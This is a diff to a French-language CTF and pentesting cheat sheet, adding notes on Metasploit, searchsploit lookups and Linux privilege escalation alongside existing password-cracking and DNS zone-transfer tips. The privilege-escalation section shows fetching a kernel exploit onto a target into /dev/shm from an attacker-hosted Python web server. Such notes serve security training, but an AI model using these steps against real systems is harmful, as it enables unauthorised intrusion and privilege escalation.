@@ -4,11 +4,12 @@
   - [Reconnaissance](#reconnaissance)
     - [Scan de port](#scan-de-port)
     - [TODO Enumération SMB](#todo-enumération-smb)
+  - [Metasploit](#metasploit)
   - [DNS](#dns)
+  - [Vulnérabilités](#vulnérabilités)
+  - [Local Privilege Escalation](#local-privilege-escalation)
   - [Cassage de mot de passe](#cassage-de-mot-de-passe)
   - [SQLite](#sqlite)
-  - [Vulnérabilités](#vulnérabilités)
-  - [Participations](#participations)
 
 Liens :
 - https://attack.mitre.org/matrices
@@ -74,6 +75,10 @@ Si les ports `139` et `445` sont ouverts, il y a des chances que SMB tourne sur 
 enum4linux -U <ip>
 ```
 
+## Metasploit
+
+`msfconsole`
+
 ## DNS
 
 Si on a trouvé un serveur DNS :
@@ -93,6 +98,43 @@ Pour faire un transfert de zone :
 dig @<?> AXFR <fqdn ?>
 ```
 
+## Vulnérabilités
+
+Pour chercher des vulnérabilités :
+- https://www.exploit-db.com
+- https://nvd.nist.gov/vuln/search
+
+ou la commande `searchsploit`:
+```bash
+# pour chercher (case insensitive AND)
+searchsploit cutenews
+# lire l'exploit
+searchsploit -x <filename>
+# copier l'exploit dans le CWD
+searchsploit -m <filename>
+```
+
+## Local Privilege Escalation
+
+Sur la machine cible :
+```bash
+# obtenir la version du noyau Linux
+uname -a
+
+# télécharger l'exploit (et le stocker en RAM)
+wget URL > /dev/shm/lpe
+```
+
+Sur ta machine :
+```bash
+# regarder s'il existe des exploit
+searchsploit 4.15
+# le télécharger
+searchsploit -m <filename>
+# l'héberger
+python -m SimpleHTTPServer
+```
+
 ## Cassage de mot de passe
 
 Pour extraire le hash du mot de passe d'un zip : `zip2john file.zip > hash.txt`
@@ -106,20 +148,3 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```bash
 sqlitebrowser fichier.sqlite
 ```
-
-## Vulnérabilités
-
-Pour chercher des vulnérabilités :
-- https://www.exploit-db.com
-- https://nvd.nist.gov/vuln/search
-
-ou la commande `searchsploit`
-
-## Participations
-
-L'important c'est de participer, du coup :
-- Rejeu du [RedHack CTF](https://redhack.eu) 2019
-- Rejeu du [Norzh CTF](https://norzh-ctf.fr) 2020
-- Qualifications du CTF de l'[European Cyber Week](https://www.european-cyber-week.eu) 2020 : 162/249
-- CTF [Brigitte Friang](https://www.challengecybersec.fr) 2020 de la DGSE
-- CTF [DG'hAck](https://www.dghack.fr) 2020 de la DGA : 343/2082
